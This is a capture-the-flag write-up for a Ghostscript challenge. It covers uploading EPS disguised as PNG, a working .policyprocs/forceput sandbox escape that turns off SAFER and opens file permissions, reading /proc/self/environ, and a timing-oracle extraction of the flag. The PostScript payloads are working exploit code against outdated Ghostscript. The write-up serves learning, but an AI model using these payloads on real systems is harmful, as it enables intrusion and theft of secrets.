# Ghosted my 2018 Script

## Flag

`GoH{Gh0st_5sr1pt_B4c7_1n_th3_d4y3!!ad3052fd746d}`

## Summary

The upload form accepts files named `.png`, but the backend still lets Ghostscript parse EPS / PostScript content. This instance is using a 2018-vulnerable Ghostscript build, so the working escape is the `1Policy` / `.policyprocs` path rather than the older `%pipe%` tricks.

The real secret is exposed through the process environment as `GZCTF_FLAG`. Directly guessing `/flag.txt` was a trap. The reliable route was:

1. Upload EPS as a fake `.png`.
2. Use `.policyprocs` to recover a `forceput`-style primitive.
3. Disable `SAFER` and widen `PermitFileReading`.
4. Read `/proc/self/environ`.
5. Use a timing oracle on `GZCTF_FLAG=...` to recover the flag.

## Working Ghostscript Escape

This payload proves the `forceput` primitive and re-enables file reads:

```postscript
%!PS
/.forceput {
  <<>> <<>>
  4 index (ignored)
  5 index 5 index
  .policyprocs 1 get exec
  pop pop pop pop pop pop pop
} def

systemdict /SAFER false .forceput
systemdict /userparams get /PermitFileControl [(*)] .forceput
systemdict /userparams get /PermitFileWriting [(*)] .forceput
systemdict /userparams get /PermitFileReading [(*)] .forceput
```

## Reliable Extraction Strategy

The stable source on the target was `/proc/self/environ`, not `/flag.txt`.

The most reliable oracle was a direct byte comparison on the substring after `GZCTF_FLAG=`:

```postscript
%!PS
/.forceput {
  <<>> <<>>
  4 index (ignored)
  5 index 5 index
  .policyprocs 1 get exec
  pop pop pop pop pop pop pop
} def

systemdict /SAFER false .forceput
systemdict /userparams get /PermitFileControl [(*)] .forceput
systemdict /userparams get /PermitFileWriting [(*)] .forceput
systemdict /userparams get /PermitFileReading [(*)] .forceput

/infile (/proc/self/environ) (r) file def
/buf 8192 string def
infile buf readstring pop
(GZCTF_FLAG=) search
{
  pop
  pop
  dup length 0 gt {
    0 get 79 gt { 200000000 { 1 1 add pop } repeat } if
  } {
    pop
  } ifelse
} {
} ifelse
showpage
```

The timing split that held up on the fresh working instance was roughly:

- `~1.1s` for false
- `~5.5s` to `~6.3s` for true

That made `repeat=200000000` and a threshold around `3.5s` good enough for one-request binary search.

## Tooling Notes

I wrote two helpers in the workspace:

- [ghosted_2018_extract.py](/home/mfekenyuzi/h4k-it/web/ghosted_2018_extract.py)
- [ghosted_2018_search_extract.py](/home/mfekenyuzi/h4k-it/web/ghosted_2018_search_extract.py)

Important bug that had to be fixed:

- `readstring` returns the actual substring read plus a boolean.
- Searching the original fixed-size buffer instead of the returned substring causes false positives from leftover tail bytes.
- After fixing that, the extracted prefix became stable and the final flag verified cleanly.

## Final Notes

- `/flag.txt` and `/var/www/flag.txt` behaved like hint text, not the real flag source.
- Full-string exact-prefix checks were useful for confirmation, but the calibrated bytewise extractor was the main recovery path.
- The instance could temporarily stop responding after a heavy true branch, so lighter delays were safer than 8-second timeout oracles.
